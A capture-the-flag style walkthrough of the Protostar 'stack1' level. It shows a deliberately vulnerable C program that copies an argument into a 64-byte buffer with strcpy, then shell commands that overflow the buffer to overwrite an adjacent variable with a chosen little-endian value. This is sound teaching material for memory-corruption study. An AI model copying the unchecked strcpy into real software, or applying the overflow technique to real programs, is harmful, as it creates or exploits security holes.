#### Stack1

###### About

- This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.

- This level is at ``/opt/protostar/bin/stack1``

- Hints
	- If you are unfamiliar with the hexadecimal being displayed, ``man ascii`` is your friend.
	- Protostar is little endian

``stack1.c``

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

###### Solution

```sh
user@protostar:/opt/protostar/bin$ ./stack1 AAA
Try again, you got 0x00000000
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ ./stack1 `python -c "print 'A'*68"`
Try again, you got 0x41414141
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ ./stack1 `python -c "print 'A'*64 +'\x64\x63\x62\x61'"`
you have correctly got the variable to the right value
user@protostar:/opt/protostar/bin$
```
